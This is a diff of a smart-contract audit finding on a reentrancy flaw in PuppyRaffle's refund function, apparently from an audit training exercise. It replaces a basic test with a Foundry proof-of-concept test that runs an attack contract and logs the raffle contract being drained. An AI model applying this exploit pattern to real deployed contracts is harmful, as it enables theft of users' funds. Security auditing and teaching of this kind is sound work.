@@ -28,18 +28,35 @@ In the `PuppyRaffle::refund` function , we make the external call to the `msg.se
 
 ```javascript
 
-    function test_refund() external {
-        vm.txGasPrice(1);
-        uint256 playerNum = 10;
-        address[] memory players = new address[](playerNum);
-        for (uint256 i = 0; i < playerNum; i++) {
-            players[i] = address(i);
-        }
-        puppyRaffle.enterRaffle{value: entranceFee * playerNum}(players);
-        uint256 balanceBefore = address(puppyRaffle).balance;
-        puppyRaffle.refund();
-        uint256 balanceAfter = address(puppyRaffle).balance;
-        assert(balanceBefore == balanceAfter);
+function test_Rentrancy_refund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        ReentranctyAttackContract attackerContract = new ReentranctyAttackContract(
+                puppyRaffle
+            );
+        address attackerUser = makeAddr("attackerUser");
+        vm.deal(attackerUser, 1e18);
+
+        uint256 startingAttackerContractBalance = address(attackerContract)
+            .balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        vm.prank(attackerUser);
+        attackerContract.attack{value: entranceFee}();
+        console.log(
+            "attacker Contract Balance",
+            startingAttackerContractBalance
+        );
+        console.log("starting contract balance", startingContractBalance);
+        console.log(
+            "ending attcker balance",
+            address(attackerContract).balance
+        );
+        console.log("ending contract balance", address(puppyRaffle).balance);
     }
     
 ```
